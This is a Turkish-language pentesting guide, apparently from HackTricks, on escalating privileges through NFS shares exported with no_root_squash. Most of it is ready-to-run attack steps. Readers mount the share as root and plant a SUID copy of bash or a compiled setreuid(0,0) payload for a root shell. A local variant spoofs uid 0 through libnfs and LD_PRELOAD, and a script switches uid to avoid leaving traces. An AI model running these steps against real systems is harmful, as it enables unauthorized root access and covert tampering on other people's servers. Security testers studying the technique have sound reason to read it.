# NFS No Root Squash Misconfiguration Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Squashing Basic Info

NFS genellikle (özellikle linux'ta) dosyalara erişim sağlamak için istemci tarafından belirtilen `uid` ve `gid`'ye güvenir (kerberos kullanılmıyorsa). Ancak, sunucuda bu davranışı **değiştirebilecek** bazı yapılandırmalar vardır:

- **`all_squash`**: Tüm erişimleri her kullanıcı ve grubu **`nobody`** (65534 unsigned / -2 signed) olarak eşleştirerek sıkıştırır. Bu nedenle, herkes `nobody`'dir ve kullanıcı kullanılmaz.
- **`root_squash`/`no_all_squash`**: Bu, Linux'ta varsayılandır ve **sadece uid 0 (root) ile erişimi sıkıştırır**. Bu nedenle, herhangi bir `UID` ve `GID` güvenilir, ancak `0` `nobody`'ye sıkıştırılır (bu nedenle root taklidi mümkün değildir).
- **`no_root_squash`**: Bu yapılandırma etkinleştirildiğinde, root kullanıcısını bile sıkıştırmaz. Bu, bu yapılandırma ile bir dizini monte ederseniz, root olarak erişebileceğiniz anlamına gelir.

**/etc/exports** dosyasında, **no_root_squash** olarak yapılandırılmış bir dizin bulursanız, o dizine **istemci olarak erişebilir** ve o dizin içinde **yerel makinenin** **root**'uymuş gibi **yazabilirsiniz**.

**NFS** hakkında daha fazla bilgi için kontrol edin:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

Seçenek 1 bash kullanarak:
- **O dizini** bir istemci makinesinde **monte ederek**, ve **root olarak monte edilen klasöre** **/bin/bash** ikili dosyasını kopyalayarak ve ona **SUID** hakları vererek, **kurban** makineden o bash ikili dosyasını çalıştırarak.
- NFS paylaşımında root olmak için, sunucuda **`no_root_squash`** yapılandırılmış olmalıdır.
- Ancak, etkinleştirilmezse, ikili dosyayı NFS paylaşımına kopyalayarak ve yükselmek istediğiniz kullanıcı olarak SUID izni vererek başka bir kullanıcıya yükseltebilirsiniz.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Seçenek 2, C derlenmiş kod kullanarak:
- **O dizini** bir istemci makinesine **bağlamak** ve **root olarak** bağlı klasöre SUID iznini kötüye kullanacak derlenmiş yükümüzü kopyalamak, ona **SUID** hakları vermek ve **kurban** makineden o ikili dosyayı çalıştırmak (burada bazı [C SUID yüklerini](payloads-to-execute.md#c) bulabilirsiniz).
- Önceki gibi aynı kısıtlamalar.
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Yerel Sömürü

> [!TIP]
> Makinenizden kurban makinesine bir **tünel oluşturabiliyorsanız, bu ayrıcalık yükseltmesini istismar etmek için uzaktan versiyonu kullanmaya devam edebilirsiniz, gerekli portları tünelleyerek**.\
> Aşağıdaki hile, dosya `/etc/exports` **bir IP gösteriyorsa** geçerlidir. Bu durumda **uzaktan istismarı kullanamayacaksınız** ve **bu hileyi kötüye kullanmanız gerekecek**.\
> İstismarın çalışması için bir diğer gerekli şart, **`/etc/export` içindeki ihracatın `insecure` bayrağını kullanmasıdır**.\
> --_Eğer `/etc/export` bir IP adresi gösteriyorsa bu hilenin işe yarayıp yaramayacağından emin değilim_--

### Temel Bilgiler

Senaryo, yerel bir makinede monte edilmiş bir NFS paylaşımını istismar etmeyi içeriyor ve NFSv3 spesifikasyonundaki bir hatayı kullanarak istemcinin uid/gid belirtmesine izin veriyor, bu da yetkisiz erişimi mümkün kılabilir. İstismar, NFS RPC çağrılarını sahtelemek için kullanılan [libnfs](https://github.com/sahlberg/libnfs) kütüphanesini içerir.

#### Kütüphaneyi Derleme

Kütüphane derleme adımları, çekirdek sürümüne bağlı olarak ayarlamalar gerektirebilir. Bu özel durumda, fallocate sistem çağrıları yorum satırına alınmıştı. Derleme süreci aşağıdaki komutları içerir:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Exploit'i Gerçekleştirme

Exploit, root yetkilerini artıran ve ardından bir shell çalıştıran basit bir C programı (`pwn.c`) oluşturmayı içerir. Program derlenir ve elde edilen ikili dosya (`a.out`), RPC çağrılarında uid'i sahtelemek için `ld_nfs.so` kullanarak suid root ile paylaşıma yerleştirilir:

1. **Exploit kodunu derleyin:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Sömürüyü paylaşımda yerleştirin ve uid'i taklit ederek izinlerini değiştirin:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Kök ayrıcalıkları elde etmek için istismarı çalıştırın:**
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell için Gizli Dosya Erişimi

Root erişimi elde edildikten sonra, sahipliği değiştirmeden (iz bırakmamak için) NFS paylaşımı ile etkileşimde bulunmak için bir Python betiği (nfsh.py) kullanılır. Bu betik, erişilen dosyanın uid'sini eşleştirerek, paylaşım üzerindeki dosyalarla izin sorunları olmadan etkileşimde bulunulmasını sağlar:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Çalıştır:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
